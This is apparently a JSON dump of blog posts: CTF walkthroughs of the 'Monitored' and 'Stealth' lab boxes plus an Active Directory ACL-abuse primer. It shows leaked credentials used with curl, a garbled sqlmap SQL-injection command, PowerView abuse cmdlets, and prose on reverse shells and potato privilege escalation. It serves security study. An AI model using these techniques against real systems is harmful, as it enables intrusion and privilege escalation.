[{"content":" Today we\u0026rsquo;ll be covering an interesting box called Monitored introduced with a medium level difficulty so let\u0026rsquo;s check it out.\nNmap Scans. Starting off with some port enumeration we get some interesting ports open.\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0) 53/tcp closed domain 80/tcp open http Apache httpd 2.4.56 135/tcp closed msrpc 389/tcp open ldap 139/tcp closed netbios-ssn 445/tcp closed microsoft-ds 464/tcp closed kpasswd5 593/tcp closed http-rpc-epmap 636/tcp closed ldapssl 1433/tcp closed ms-sql-s 3268/tcp closed globalcatLDAP 3269/tcp closed globalcatLDAPssl 5667/tcp open tcpwrapped Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Web Enumeration (port 80) Intially checking port 80 it redirects to nagios.monitored.htb checking the site out. We are redirected to nagios XI. which is a server and networking monitoring software.\nFuzzing port 80. Trying login with the default credentials found online didn\u0026rsquo;t provide us with access, hence the next step was to fuzz for some directory that might be hidden.\n.hta [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 305ms] [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 306ms] .php [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 244ms] .hta.php [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 257ms] .htaccess [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 243ms] .htpasswd [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 231ms] .htpasswd.php [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 238ms] .htaccess.php [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 247ms] cgi-bin/.php [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 324ms] cgi-bin/ [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 324ms] index.php [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 208ms] index.php [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 254ms] javascript [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 215ms] nagios [Status: 401, Size: 460, Words: 42, Lines: 15, Duration: 227ms] server-status [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 239ms] We see that the nagios directory seems interesting but navigating tot the directory doesn\u0026rsquo;t produce anything fruitful, but looking at the link on the site we identify a certian keyword which seems like a directory nagiosxi.\nnagiosxi Fuzzing the directory we get some interesting directories,\n# directory-list-2.3-small.txt [Status: 200, Size: 26737, Words: 5495, Lines: 468, Duration: 486ms] help [Status: 200, Size: 26749, Words: 5495, Lines: 468, Duration: 267ms] tools [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 298ms] mobile [Status: 200, Size: 15978, Words: 2562, Lines: 225, Duration: 296ms] admin [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 279ms] reports [Status: 200, Size: 26755, Words: 5495, Lines: 468, Duration: 296ms] account [Status: 200, Size: 26755, Words: 5495, Lines: 468, Duration: 294ms] includes [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 333ms] backend [Status: 200, Size: 108, Words: 4, Lines: 5, Duration: 306ms] db [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 251ms] api [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 210ms] config [Status: 200, Size: 26753, Words: 5495, Lines: 468, Duration: 291ms] views [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 280ms] sounds [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 259ms] terminal [Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 275ms] Checking out terminal directory, there\u0026rsquo;s a shell in box gui which after trying out soem authentication bypasses it didn\u0026rsquo;t work. Later on went on to fuzz the api endpoint.\nAPI Fuzzing the API endpoints gives us 2 endpoints the v1 and includes. v1 when fuzzing api endpoints is an indicator of version controlled endpoints. checking out the v1 endpoint we get a lot of results.\nNote: If we visit /api/v1/xxx we can see that all the “endpoints” were giving us same message with size of 32 so we gave -fs 32 option to filter out mostly false-positive hits.`\nlicense [Status: 200, Size: 34, Words: 3, Lines: 2, Duration: 1163ms] %20 [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 350ms] video games [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 288ms] authenticate [Status: 200, Size: 53, Words: 7, Lines: 2, Duration: 2336ms] We get an interesting endpoint called authenticate but trying to access it we find that, we can only use POST to authenticate and since we don\u0026rsquo;t have any credentials to authenticate with decided to go back to the nmap results and enumerate more.\nUDP PORT STATE SERVICE 7/udp open|filtered echo 53/udp open|filtered domain 68/udp open|filtered dhcpc 123/udp open ntp 161/udp open snmp 162/udp open|filtered snmptrap 16838/udp open|filtered unknown 18617/udp open|filtered unknown 21131/udp open|filtered unknown 21698/udp open|filtered unknown 28547/udp open|filtered unknown 49181/udp open|filtered unknown Enumerating UDP ports, we find that snmp is open, enumerating snmp using braa a mass snmp scanner. We get interesting results.\niso.3.6.1.2.1.25.4.2.1.5.505 = STRING: \u0026#34;--config /etc/laurel/config.toml\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.549 = STRING: \u0026#34;-f\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.550 = STRING: \u0026#34;--system --address=systemd: --no fork --nopidfile --systemd-activation --syslog-only\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.553 = STRING: \u0026#34;-n -iNONE\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.556 = STRING: \u0026#34;-u -s -O /run/wpa_supplicant\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.568 = STRING: \u0026#34;-f\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.583 = STRING: \u0026#34;-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB \u0026#34; iso.3.6.1.2.1.25.4.2.1.5.642 = STRING: \u0026#34;-4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.762 = STRING: \u0026#34;-f /usr/local/nagios/etc/pnp/npcd.cfg\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.769 = STRING: \u0026#34;-LOw -f -p /run/snmptrapd.pid\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.783 = STRING: \u0026#34;-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.804 = STRING: \u0026#34;-p /var/run/ntpd.pid -g -u 108:116\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.806 = STRING: \u0026#34;-o -p -- \\\\u --noclear tty1 linux\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.841 = STRING: \u0026#34;-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.843 = STRING: \u0026#34;-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.848 = STRING: \u0026#34;-h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.860 = STRING: \u0026#34;-k start\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.870 = STRING: \u0026#34;-D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.942 = STRING: \u0026#34;/usr/sbin/snmptt --daemon\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.943 = STRING: \u0026#34;/usr/sbin/snmptt --daemon\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.972 = STRING: \u0026#34;-pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.976 = STRING: \u0026#34;-d /usr/local/nagios/etc/nagios.cfg\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.977 = STRING: \u0026#34;--worker /usr/local/nagios/var/rw/nagios.qh\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.978 = STRING: \u0026#34;--worker /usr/local/nagios/var/rw/nagios.qh\u0026#34; iso.3.6.1.2.1.25.4.2.1.5.979 = STRING: \u0026#34;--worker /usr/local/nagios/var/rw/nagios.qh\u0026#34; we identify there\u0026rsquo;s a user called svc and also a passowrd that the user tried to authenticate with.\niso.3.6.1.2.1.25.4.2.1.5.583 = STRING: \u0026#34;-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB \u0026#34; Initial Foothold. Now having creds to login and hving prior knowledge that we have a few instances on the API and terminal endpoints that we had to try out, started out with the terminal endpoint, didn\u0026rsquo;t give us any results, proceeded to the API endpoint where we are need to construct a post request so as to authenticate.\nAn Auth Token Obtain after using curl.\ncurl -X POST -k -L -d \u0026#39;username=svc\u0026amp;password=XjH7VCehowpR1xZB\u0026#39; https://nagios.monitored.htb/nagiosxi/api/v1/authenticate/``` ```bash {\u0026#34;username\u0026#34;:\u0026#34;svc\u0026#34;,\u0026#34;user_id\u0026#34;:\u0026#34;2\u0026#34;,\u0026#34;auth_token\u0026#34;:\u0026#34;76064ac8a8a9ece7c349404e1f99a45665e9acfc\u0026#34;,\u0026#34;valid_min\u0026#34;:5,\u0026#34;valid_until\u0026#34;:\u0026#34;Fri, 23 Feb 2024 22:38:15 -0500\u0026#34;} we get an auth token, going back to the nagios directory, we can authenticate and successfully login.\nAccording with this CVE there is a Post-Auth SQLi, so let’s try POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1 to get the admin api_key which is in xi_users in this sqlmap command on the way to add new user with administrative privileges\nsqlmap -u \u0026#34;https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message\u0026amp;id=3\u0026amp;token=curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate\u0026#34; --level 5 --risk 3 -p id --batch -D nagiosxi --dump -T xi_users | awk -F\u0026#39;\u0026#34;\u0026#39; \u0026#39;{print$12}\u0026#39;\u0026#34; --level 5 --risk 3 -p id --batch -D nagiosxi --dump -T xi_users ","permalink":"http://localhost:1313/posts/htb/manager/","summary":"Today we\u0026rsquo;ll be covering an interesting box called Monitored introduced with a medium level difficulty so let\u0026rsquo;s check it out.\nNmap Scans. Starting off with some port enumeration we get some interesting ports open.\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0) 53/tcp closed domain 80/tcp open http Apache httpd 2.4.56 135/tcp closed msrpc 389/tcp open ldap 139/tcp closed netbios-ssn 445/tcp closed microsoft-ds 464/tcp closed kpasswd5 593/tcp closed http-rpc-epmap 636/tcp closed ldapssl 1433/tcp closed ms-sql-s 3268/tcp closed globalcatLDAP 3269/tcp closed globalcatLDAPssl 5667/tcp open tcpwrapped Service Info: Host: nagios.","title":"Monitored"},{"content":"Hi guys, welcome back to another Tryhackme room starting off the year with.\n","permalink":"http://localhost:1313/posts/tryhackme/simple-ctf/easyctf/","summary":"Hi guys, welcome back to another Tryhackme room starting off the year with.","title":"Simple CTF"},{"content":"Access Control List (ACL) Abuse Primer For security reasons, not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through Access Control Lists (ACLs). Posing a serious threat to the security posture of the domain, a slight misconfiguration to an ACL can leak permissions to other objects that do not need it.\nAccess Control List (ACL) Overview In their simplest form, ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned. The settings themselves in an ACL are called Access Control Entries (ACEs). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD. ACLs can also be used for auditing access within AD.\nThere are two types of ACLs: Discretionary Access Control List (DACL) - defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.\nSystem Access Control Lists (SACL) - allow administrators to log access attempts made to secured objects.\nWe see the ACL for the user account forend in the image below. Each item under Permission entries makes up the DACL for the user account, while the individual entries (such as Full Control or Change Password) are ACE entries showing rights granted over this user object to various users and groups.\nViewing forend\u0026rsquo;s ACL\nThe SACLs can be seen within the Auditing tab.\nViewing the SACLs through the Auditing Tab\nAccess Control Entries (ACEs) As stated previously, Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a given securable object. There are three main types of ACEs that can be applied to all securable objects in AD:\nACE\tDescription\nAccess denied ACE -\tUsed within a DACL to show that a user or group is explicitly denied access to an object Access allowed ACE - Used within a DACL to show that a user or group is explicitly granted access to an object System audit ACE - Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred Each ACE is made up of the following four components:\nThe security identifier (SID) of the user/group that has access to the object (or principal name graphically) A flag denoting the type of ACE (access denied, allowed, or system audit ACE) A set of flags that specify whether or not child containers/objects can inherit the given ACE entry from the primary or parent object An access mask which is a 32-bit value that defines the rights granted to an object We can view this graphically in Active Directory Users and Computers (ADUC). In the example image below, we can see the following for the ACE entry for the user forend:\nViewing Permissions through Active Directory Users \u0026amp; Computers The security principal is Angela Dunn (adunn@inlanefreight.local) The ACE type is Allow Inheritance applies to the \u0026ldquo;This object and all descendant objects,” meaning any child objects of the forend object would have the same permissions granted The rights granted to the object, again shown graphically in this example When access control lists are checked to determine permissions, they are checked from top to bottom until an access denied is found in the list.\nWhy are ACEs Important? Attackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments. During an assessment where the client has taken care of all of the \u0026ldquo;low hanging fruit\u0026rdquo; AD flaws/misconfigurations, ACL abuse can be a great way for us to move laterally/vertically and even achieve full domain compromise. Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:\nForceChangePassword abused with Set-DomainUserPassword Add Members abused with Add-DomainGroupMember GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember GenericWrite abused with Set-DomainObject WriteOwner abused with Set-DomainObjectOwner WriteDACL abused with Add-DomainObjectACL AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember Addself abused with Add-DomainGroupMember enumerating and leveraging four specific ACEs to highlight the power of ACL attacks: ForceChangePassword - gives us the right to reset a user\u0026rsquo;s password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords). GenericWrite - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module. AddSelf - shows security groups that a user can add themselves to. GenericAll - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the Local Administrator Password Solution (LAPS) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access. This graphic, adapted from a graphic created by Charlie Bromberg (Shutdown), shows an excellent breakdown of the varying possible ACE attacks and the tools to perform these attacks from both Windows and Linux (if applicable). In the following few sections, we will mainly cover enumerating and performing these attacks from a Windows attack host with mentions of how these attacks could be performed from Linux. A later module specifically on ACL Attacks will go much further in-depth on each of the attacks listed in this graphic and how to perform them from Windows and Linux.\nWe will run into many other interesting ACEs (privileges) in Active Directory from time to time. The methodology for enumerating possible ACL attacks using tools such as BloodHound and PowerView and even built-in AD management tools should be adaptable enough to assist us whenever we encounter new privileges in the wild that we may not yet be familiar with. For example, we may import data into BloodHound and see that a user we have control over (or can potentially take over) has the rights to read the password for a Group Managed Service Account (gMSA) through the ReadGMSAPassword edge. In this case, there are tools such as GMSAPasswordReader that we could use, along with other methods, to obtain the password for the service account in question. Other times we may come across extended rights such as Unexpire-Password or Reanimate-Tombstones using PowerView and have to do a bit of research to figure out how to exploit these for our benefit. It\u0026rsquo;s worth familiarizing yourself with all of the BloodHound edges and as many Active Directory Extended Rights as possible as you never know when you may encounter a less common one during an assessment.\nACL Attacks in the Wild We can use ACL attacks for:\nLateral movement Privilege escalation Persistence Some common attack scenarios may include:\nAttack Description Attack Description Abusing forgot password permissions Help Desk and other IT users are often granted permissions to perform password resets and other privileged tasks. If we can take over an account with these privileges (or an account in a group that confers these privileges on its users), we may be able to perform a password reset for a more privileged account in the domain. Abusing group membership management It\u0026rsquo;s also common to see Help Desk and other staff that have the right to add/remove users from a given group. It is always worth enumerating this further, as sometimes we may be able to add an account that we control into a privileged built-in AD group or a group that grants us some sort of interesting privilege. Excessive user rights We also commonly see user, computer, and group objects with excessive rights that a client is likely unaware of. This could occur after some sort of software install (Exchange, for example, adds many ACL changes into the environment at install time) or some kind of legacy or accidental configuration that gives a user unintended rights. Sometimes we may take over an account that was given certain rights out of convenience or to solve a nagging problem more quickly. Note: Some ACL attacks can be considered \u0026ldquo;destructive,\u0026rdquo; such as changing a user\u0026rsquo;s password or performing other modifications within a client\u0026rsquo;s AD domain. If in doubt, it\u0026rsquo;s always best to run a given attack by our client before performing it to have written documentation of their approval in case an issue arises. We should always carefully document our attacks from start to finish and revert any changes. This data should be included in our report, but we should also highlight any changes we make clearly so that the client can go back and verify that our changes were indeed reverted properly.\n","permalink":"http://localhost:1313/posts/active-directory/acls/","summary":"Access Control List (ACL) Abuse Primer For security reasons, not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through Access Control Lists (ACLs). Posing a serious threat to the security posture of the domain, a slight misconfiguration to an ACL can leak permissions to other objects that do not need it.\nAccess Control List (ACL) Overview In their simplest form, ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned.","title":"ACL AD"},{"content":" stealth tryhackmeroom\nnmap scans PORT STATE SERVICE REASON VERSION 139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? syn-ack 3389/tcp open ms-wbt-server syn-ack Microsoft Terminal Services |_ssl-date: 2023-11-30T18:28:49+00:00; -1s from scanner time. | rdp-ntlm-info: | Target_Name: HOSTEVASION | NetBIOS_Domain_Name: HOSTEVASION | NetBIOS_Computer_Name: HOSTEVASION | DNS_Domain_Name: HostEvasion | DNS_Computer_Name: HostEvasion | Product_Version: 10.0.17763 |_ System_Time: 2023-11-30T18:28:10+00:00 | ssl-cert: Subject: commonName=HostEvasion | Issuer: commonName=HostEvasion | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2023-07-28T19:06:15 | Not valid after: 2024-01-27T19:06:15 | MD5: 110c:1c21:e230:b7c7:41f5:4b6a:bf2b:9e6a | SHA-1: 34ad:3702:1a0a:2054:88a9:ea0c:820b:da64:b1bd:fb56 | -----BEGIN CERTIFICATE----- | MIIC2jCCAcKgAwIBAgIQMIOcafxeh79B5cu+rs/taDANBgkqhkiG9w0BAQsFADAW | MRQwEgYDVQQDEwtIb3N0RXZhc2lvbjAeFw0yMzA3MjgxOTA2MTVaFw0yNDAxMjcx | OTA2MTVaMBYxFDASBgNVBAMTC0hvc3RFdmFzaW9uMIIBIjANBgkqhkiG9w0BAQEF | AAOCAQ8AMIIBCgKCAQEA2tUyXSZT7x2YueFMia0tU6xweBIvbwEXw0MBCXtHEf9A | LqZ6aiwNSsiLeW/kfBsqw6LArZNajuGggR2uj2HLGMn9Yx2RjnMSUaVWlJnB+j7s | YsgeVOr3Y8rFv0EPD2M6tKEZ7Zh8HoaBifHR3qeNIx+n6YcYmSjb0mUQ5kQso7SS | L7a9Beya4aynWgHXegaCVP0CcA750BRf1Ax+tjpojoTJOarC0C1QibbDs0s6NbUY | Z1CakxCRQlENDRau+vqqhRMxlbEfayl1YICTfMe6j3hMnVeYiPjZECt2nSe92i2p | rnzpdZ4Xbe8tdDzGETQGkBdOCOKPk6/nh80ifpcjBQIDAQABoyQwIjATBgNVHSUE | DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBABB4 | HKrRnIrik9ef1F3Ah6r4FsdpCmZ0vXLNixsqm8IY81fNcRTogc/WFytU9gylcxRk | LhoUqXwtQhKqMFOKcEh3Kq2+VMUvgxTxvDywFS4S02AlhWtafq8NBm5nfxxubuit | tRO3fvdQ7mKS2hWvapW9+guEt0zJZI3Ai/C4NIq5WpbLEGSJe6DHUwXaPyFiHNYy | 5j91hKUWbDnIy4TqiIPjhBjYhrTvi46fbGbqMpHelUGABzJ5LFfGjORMOWA1bRPz | wuaEP62Dimr42pzbLPIgGTmBwpIXlpKdcydbJnVORxY4AfpLV6ypt2EPYS2TpKbz | 4Fw5A8aWrShuerOI7mc= |_-----END CERTIFICATE----- 5985/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 8000/tcp open http syn-ack PHP cli server 5.5 or later |_http-title: 404 Not Found | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 8080/tcp open http syn-ack Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28 |_http-title: PowerShell Script Analyser | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 8443/tcp open ssl/http syn-ack Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28) |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=localhost | Issuer: commonName=localhost | Public Key type: rsa | Public Key bits: 1024 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2009-11-10T23:48:47 | Not valid after: 2019-11-08T23:48:47 | MD5: a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0 | SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6 | -----BEGIN CERTIFICATE----- | MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls | b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD | VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj | 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o | J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT | gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD | gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd | aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL | vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE= |_-----END CERTIFICATE----- |_http-title: PowerShell Script Analyser | tls-alpn: |_ http/1.1 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 47001/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open msrpc syn-ack Microsoft Windows RPC 49665/tcp open msrpc syn-ack Microsoft Windows RPC 49666/tcp open msrpc syn-ack Microsoft Windows RPC 49667/tcp open msrpc syn-ack Microsoft Windows RPC 49668/tcp open msrpc syn-ack Microsoft Windows RPC 49669/tcp open msrpc syn-ack Microsoft Windows RPC 49670/tcp open msrpc syn-ack Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 0s, deviation: 0s, median: -1s | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 52662/tcp): CLEAN (Timeout) | Check 2 (port 33712/tcp): CLEAN (Timeout) | Check 3 (port 30307/udp): CLEAN (Timeout) | Check 4 (port 41933/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-time: | date: 2023-11-30T18:28:10 |_ start_date: N/A checking the site Checking the site out as described on tryhackme we are presented a site.\nSo on the site we are only allowed to upload powershell scripts, we need to upload a script which will give us a reverse sehll to connect to the machine.\ninitial foothold Generating a reverse shell with revshells and uploading it on the website we get a connection back.\nDisclaimer\nAfter uploading the script and using netcat as your listener you\u0026rsquo;ll get a shell connection back but without the terminal instant which is \u0026lsquo;funny\u0026rsquo; to work with. A better shell instance that i got was from this guy malw0re. So after uploading we get a clean looking shell back. Searching the folders we land on the Desktop folder and there is a file called encodedflag.\nDecoding and reading the file we get some interesting message.\nFollowing the decoded message and checking it out on the webpage we get an interesting message. user level flag. Checking the documents file there is a directory called tasks inside it there\u0026rsquo;s a file called log.txt and from the webpage response we need to remove the log file not to alert the blue team, removing the log file and reloading the webpage we get nothing so got stuck for a while. Then reading the file.ps1 we see there is a directory hosting xampp\nUnder the uploads directory, we identify the a log file removing it and refreshing the page we get the first flag.\nroot level flag. Having the user flag we need to look out for privesc vectors on the box and since it\u0026rsquo;s a windows box i uploaded a powershell script that looks for some vectors.\nThe command is downloading the (win-priv-check.ps1) from my attacker ip address using using the Invoke-WebRequest cmdlet and saving it locally as win.ps1. Running the script it identifies apache is running as admin.\nLet\u0026rsquo;s check evader\u0026rsquo;s privileges and check if we can abuse any privileges.\nso we don\u0026rsquo;t have any specific privilege that we can abuse so my next step was to upload a malicious php script to the webserver using pownyshell.\nchecking the privileges we see it\u0026rsquo;s different from the output we go previously.\nAs we can see we can abuse the \u0026ldquo;SetImpersonatePrivilege\u0026rdquo; any process holding this privilege can impersonate (but not create) any token for which it is able to gethandle. You can get a privileged token from a Windows service (DCOM) making it perform an NTLM authentication against the exploit, then execute a process as SYSTEM referenced from here.\nSo our privesc vector are all relate to a potato exploit and after trying and failing i landed on the \u0026ldquo;efspotato\u0026rdquo; exploit which worked and elevate our privileges to NT SYSTEM!!\nTrying to get the admin flag we are face with some errors.\nSo the next step was creating a user with admin privileges then rdp into the machine and get the machine.\nLogin into the machine with the created user and get the flag\nHope you learnt something new ✨\n","permalink":"http://localhost:1313/posts/tryhackme/stealth/","summary":"stealth tryhackmeroom\nnmap scans PORT STATE SERVICE REASON VERSION 139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? syn-ack 3389/tcp open ms-wbt-server syn-ack Microsoft Terminal Services |_ssl-date: 2023-11-30T18:28:49+00:00; -1s from scanner time. | rdp-ntlm-info: | Target_Name: HOSTEVASION | NetBIOS_Domain_Name: HOSTEVASION | NetBIOS_Computer_Name: HOSTEVASION | DNS_Domain_Name: HostEvasion | DNS_Computer_Name: HostEvasion | Product_Version: 10.0.17763 |_ System_Time: 2023-11-30T18:28:10+00:00 | ssl-cert: Subject: commonName=HostEvasion | Issuer: commonName=HostEvasion | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2023-07-28T19:06:15 | Not valid after: 2024-01-27T19:06:15 | MD5: 110c:1c21:e230:b7c7:41f5:4b6a:bf2b:9e6a | SHA-1: 34ad:3702:1a0a:2054:88a9:ea0c:820b:da64:b1bd:fb56 | -----BEGIN CERTIFICATE----- | MIIC2jCCAcKgAwIBAgIQMIOcafxeh79B5cu+rs/taDANBgkqhkiG9w0BAQsFADAW | MRQwEgYDVQQDEwtIb3N0RXZhc2lvbjAeFw0yMzA3MjgxOTA2MTVaFw0yNDAxMjcx | OTA2MTVaMBYxFDASBgNVBAMTC0hvc3RFdmFzaW9uMIIBIjANBgkqhkiG9w0BAQEF | AAOCAQ8AMIIBCgKCAQEA2tUyXSZT7x2YueFMia0tU6xweBIvbwEXw0MBCXtHEf9A | LqZ6aiwNSsiLeW/kfBsqw6LArZNajuGggR2uj2HLGMn9Yx2RjnMSUaVWlJnB+j7s | YsgeVOr3Y8rFv0EPD2M6tKEZ7Zh8HoaBifHR3qeNIx+n6YcYmSjb0mUQ5kQso7SS | L7a9Beya4aynWgHXegaCVP0CcA750BRf1Ax+tjpojoTJOarC0C1QibbDs0s6NbUY | Z1CakxCRQlENDRau+vqqhRMxlbEfayl1YICTfMe6j3hMnVeYiPjZECt2nSe92i2p | rnzpdZ4Xbe8tdDzGETQGkBdOCOKPk6/nh80ifpcjBQIDAQABoyQwIjATBgNVHSUE | DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBABB4 | HKrRnIrik9ef1F3Ah6r4FsdpCmZ0vXLNixsqm8IY81fNcRTogc/WFytU9gylcxRk | LhoUqXwtQhKqMFOKcEh3Kq2+VMUvgxTxvDywFS4S02AlhWtafq8NBm5nfxxubuit | tRO3fvdQ7mKS2hWvapW9+guEt0zJZI3Ai/C4NIq5WpbLEGSJe6DHUwXaPyFiHNYy | 